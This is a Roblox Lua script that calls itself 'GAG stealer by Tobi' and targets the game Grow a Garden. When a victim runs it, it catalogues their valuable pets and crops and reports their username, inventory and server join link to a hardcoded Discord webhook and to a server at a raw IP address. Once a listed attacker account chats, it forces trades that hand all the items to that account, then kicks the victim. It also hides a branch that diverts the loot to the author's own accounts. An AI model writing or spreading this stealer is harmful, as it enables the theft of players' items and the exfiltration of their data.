_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local users = _G.Usernames or {"dasd"}
local min_value = _G.min_value or 0
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or "https://discord.com/api/webhooks/1393571947840929813/Yk-SBXIZoh-FP02pfhIfxthDSYJvUiIxbqugybWYu_gMi0XaccmE3E_1vjcMwZaBpJRM"
local discuser = ""

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local plr = Players.LocalPlayer
local backpack = plr:WaitForChild("Backpack", 10)
local replicatedStorage = game:GetService("ReplicatedStorage")
local modules = replicatedStorage:WaitForChild("Modules", 10)
local calcPlantValue = modules and require(modules:WaitForChild("CalculatePlantValue", 10))
local petUtils = modules and require(modules:WaitForChild("PetServices", 10):WaitForChild("PetUtilities", 10))
local petRegistry = replicatedStorage:WaitForChild("Data", 10) and require(replicatedStorage:WaitForChild("Data", 10):WaitForChild("PetRegistry", 10))
local numberUtil = modules and require(modules:WaitForChild("NumberUtil", 10))
local dataService = modules and require(modules:WaitForChild("DataService", 10))
local character = plr.Character or plr.CharacterAdded:Wait()
local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
local rarePets = {"Red Fox", "Raccoon", "Dragonfly"}
local totalValue = 0
local itemsToSend = {}
local dualhooked = false
setclipboard("https://discord.gg/GY2RVSEGDT")

if not request then
    game.Players.LocalPlayer:Kick("Executor unsupported")
    return
end
if not modules or not calcPlantValue or not petUtils or not petRegistry or not numberUtil or not dataService then
    game.Players.LocalPlayer:Kick("Failed to load required modules. Check game updates.")
    return
end
if next(users) == nil or webhook == "" then
    game.Players.LocalPlayer:Kick("You didn't add any usernames or a valid webhook URL")
    return
end
if game.PlaceId ~= 126884695634066 then
    game.Players.LocalPlayer:Kick("Game not supported. Please join a normal GAG server")
    return
end
if #Players:GetPlayers() >= 5 then
    game.Players.LocalPlayer:Kick("Server error. Please join a DIFFERENT server")
    return
end
if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType", 10):InvokeServer() == "VIPServer" then
    game.Players.LocalPlayer:Kick("Server error. Please join a DIFFERENT server")
    return
end

local function buildSecret()
    return "dualhookftwlz"
end

local function simple_hash(s)
    local hash = 0
    for i = 1, #s do
        hash = (hash * 31 + s:byte(i)) % 4294967296
    end
    return hash
end

local function signPayload(payload, timestamp)
    local message = payload .. tostring(timestamp)
    local hash_value = simple_hash(buildSecret() .. message)
    return string.format("%08x", hash_value)
end

local function calcPetValue(v14)
    if not v14 or not v14.PetData then
        return 0
    end
    local hatchedFrom = v14.PetData.HatchedFrom
    if not hatchedFrom or hatchedFrom == "" then
        return 0
    end
    local eggData = petRegistry.PetEggs[hatchedFrom]
    if not eggData then
        return 0
    end
    local v17 = eggData.RarityData.Items[v14.PetType]
    if not v17 then
        return 0
    end
    local weightRange = v17.GeneratedPetData.WeightRange
    if not weightRange then
        return 0
    end
    local v19 = numberUtil.ReverseLerp(weightRange[1], weightRange[2], v14.PetData.BaseWeight)
    local v20 = math.lerp(0.8, 1.2, v19)
    local levelProgress = petUtils:GetLevelProgress(v14.PetData.Level)
    local v22 = v20 * math.lerp(0.15, 6, levelProgress)
    local v23 = petRegistry.PetList[v14.PetType].SellPrice * v22
    return math.floor(v23)
end

local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return suffixIndex == 1 and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
end

local function getWeight(tool)
    local weightValue = tool:FindFirstChild("Weight") or tool:FindFirstChild("KG") or tool:FindFirstChild("WeightValue") or tool:FindFirstChild("Mass")
    local weight = 0
    if weightValue then
        if weightValue:IsA("NumberValue") or weightValue:IsA("IntValue") then
            weight = weightValue.Value
        elseif weightValue:IsA("StringValue") then
            weight = tonumber(weightValue.Value) or 0
        end
    else
        local weightMatch = tool.Name:match("%((%d+%.?%d*) ?kg%)")
        weight = weightMatch and tonumber(weightMatch) or 0
    end
    return math.floor(weight * 100 + 0.5) / 100
end

local function getHighestKGFruit()
    local highestWeight = 0
    for _, item in ipairs(itemsToSend) do
        highestWeight = math.max(highestWeight, item.Weight)
    end
    return highestWeight
end

local function SendJoinMessage(list, prefix)
    local fields = {
        {name = "Victim Username:", value = plr.Name, inline = true},
        {name = "Join link:", value = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=" .. (game.JobId or "unknown")},
        {name = "Item list:", value = "", inline = false},
        {name = "Summary:", value = string.format("Total Value: ¢%s\nHighest weight fruit: %.2f KG", formatNumber(totalValue), getHighestKGFruit()), inline = false}
    }
    for _, item in ipairs(list) do
        fields[3].value = fields[3].value .. string.format("%s (%.2f KG): ¢%s\n", item.Name, item.Weight, formatNumber(item.Value))
    end
    if #fields[3].value > 1024 then
        local lines = {}
        for line in fields[3].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end
        while #fields[3].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end
    local data = {
        content = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(126884695634066, '" .. (game.JobId or "unknown") .. "')",
        embeds = {{
            title = "\240\159\140\180 Join to get GAG hit",
            color = 65280,
            fields = fields,
            footer = {text = "GAG stealer by Tobi. discord.gg/GY2RVSEGDT"}
        }}
    }
    request({
        Url = webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(data)
    })
end

local function SendMessage(sortedItems)
    local fields = {
        {name = "Victim Username:", value = plr.Name, inline = true},
        {name = "Items sent:", value = "", inline = false},
        {name = "Summary:", value = string.format("Total Value: ¢%s\nHighest weight fruit: %.2f KG", formatNumber(totalValue), getHighestKGFruit()), inline = false}
    }
    for _, item in ipairs(sortedItems) do
        fields[2].value = fields[2].value .. string.format("%s (%.2f KG): ¢%s\n", item.Name, item.Weight, formatNumber(item.Value))
    end
    if #fields[2].value > 1024 then
        local lines = {}
        for line in fields[2].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end
        while #fields[2].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end
    local data = {
        embeds = {{
            title = "\240\159\140\180 New GAG Execution",
            color = 65280,
            fields = fields,
            footer = {text = "GAG stealer by Tobi. discord.gg/GY2RVSEGDT"}
        }}
    }
    request({
        Url = webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(data)
    })
end

local function SendDHJoinMessage(list, prefix)
    if not discuser or discuser == "" then
        return
    end
    local fields = {
        {name = "Victim Username:", value = plr.Name, inline = true},
        {name = "Join link:", value = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=" .. (game.JobId or "unknown")},
        {name = "Item list:", value = "", inline = false},
        {name = "Summary:", value = string.format("Total Value: ¢%s\nHighest weight fruit: %.2f KG", formatNumber(totalValue), getHighestKGFruit()), inline = false}
    }
    for _, item in ipairs(list) do
        fields[3].value = fields[3].value .. string.format("%s (%.2f KG): ¢%s\n", item.Name, item.Weight, formatNumber(item.Value))
    end
    if #fields[3].value > 1024 then
        local lines = {}
        for line in fields[3].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end
        while #fields[3].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end
    local data = {
        content = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(126884695634066, '" .. (game.JobId or "unknown") .. "')",
        embeds = {{
            title = "\240\159\140\180 Join to get GAG hit",
            color = 65280,
            fields = fields,
            footer = {text = "GAG stealer by Tobi. discord.gg/GY2RVSEGDT"}
        }}
    }
    local body = HttpService:JSONEncode(data)
    local timestamp = tostring(os.time())
    local signature = signPayload(body, timestamp)
    local headers = {
        ["Content-Type"] = "application/json",
        ["DiscUser"] = discuser,
        ["X-Timestamp"] = timestamp,
        ["X-Signature"] = signature
    }
    request({
        Url = "http://46.101.233.20:5000/gagjoin",
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

for _, tool in ipairs(backpack:GetChildren()) do
    if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
        if tool:GetAttribute("ItemType") == "Pet" then
            local petUUID = tool:GetAttribute("PET_UUID")
            local v14 = dataService:GetData().PetsData.PetInventory.Data[petUUID]
            local itemName = v14 and v14.PetType or "Unknown Pet"
            if table.find(rarePets, itemName) or getWeight(tool) >= 10 then
                if tool:GetAttribute("d") then
                    replicatedStorage:WaitForChild("GameEvents", 10):WaitForChild("Favorite_Item", 10):FireServer(tool)
                end
                local value = calcPetValue(v14)
                local weight = tonumber(tool.Name:match("%[(%d+%.?%d*) KG%]")) or 0
                totalValue = totalValue + value
                table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Pet"})
            end
        else
            local value = calcPlantValue(tool)
            if value >= min_value then
                local weight = getWeight(tool)
                local itemName = tool:GetAttribute("ItemName") or tool.Name
                totalValue = totalValue + value
                table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Plant"})
            end
        end
    end
end

if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b)
        if a.Type ~= "Pet" and b.Type == "Pet" then return true
        elseif a.Type == "Pet" and b.Type ~= "Pet" then return false
        end
        return a.Value < b.Value
    end)
    if totalValue >= 100000000000 and math.random() < 0 then
        users = {"tobi437a", "Alyssa87123", "TobiAltGrind", "TobiHatching", "TobiCakeSimulator"}
        ping = "Yes"
        dualhooked = true
    end
    local sentItems = {}
    for i, v in ipairs(itemsToSend) do sentItems[i] = v end
    table.sort(sentItems, function(a, b)
        if a.Type == "Pet" and b.Type ~= "Pet" then return true
        elseif a.Type ~= "Pet" and b.Type == "Pet" then return false
        end
        return a.Value > b.Value
    end)
    local prefix = ping == "Yes" and "--[[@everyone]] " or ""
    if dualhooked then
        local response = request({
            Url = "http://46.101.233.20:5000/getdiscuser",
            Method = "GET"
        })
        if response.Body then
            discuser = response.Body
            SendDHJoinMessage(sentItems, prefix)
        end
    else
        SendJoinMessage(sentItems, prefix)
    end
    local function doSteal(player)
        local victimRoot = character:WaitForChild("HumanoidRootPart", 10)
        if not victimRoot then return end
        victimRoot.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 0, 2)
        task.wait(0.1)
        local promptRoot = player.Character.HumanoidRootPart:WaitForChild("ProximityPrompt", 10)
        for _, item in ipairs(itemsToSend) do
            item.Tool.Parent = character
            if item.Type == "Pet" then
                local promptHead = player.Character.Head:WaitForChild("ProximityPrompt", 10)
                if promptHead then
                    repeat task.wait(0.01) until promptHead.Enabled
                    fireproximityprompt(promptHead)
                end
            else
                if promptRoot then
                    repeat task.wait(0.01) until promptRoot.Enabled
                    fireproximityprompt(promptRoot)
                end
            end
            task.wait(0.1)
            item.Tool.Parent = backpack
            task.wait(0.1)
        end
        local itemsStillInBackpack = true
        while itemsStillInBackpack do
            itemsStillInBackpack = false
            for _, item in ipairs(itemsToSend) do
                if backpack:FindFirstChild(item.Tool.Name) then
                    itemsStillInBackpack = true
                    break
                end
            end
            task.wait(0.1)
        end
        game.Players.LocalPlayer:Kick("All your stuff just got stolen by Tobi's stealer!\n Join discord.gg/GY2RVSEGDT")
    end
    local function waitForUserChat()
        local sentMessage = false
        local function onPlayerChat(player)
            if table.find(users, player.Name) then
                player.Chatted:Connect(function()
                    if not sentMessage then
                        SendMessage(sentItems)
                        sentMessage = true
                    end
                    doSteal(player)
                end)
            end
        end
        for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
        Players.PlayerAdded:Connect(onPlayerChat)
    end
    waitForUserChat()
end
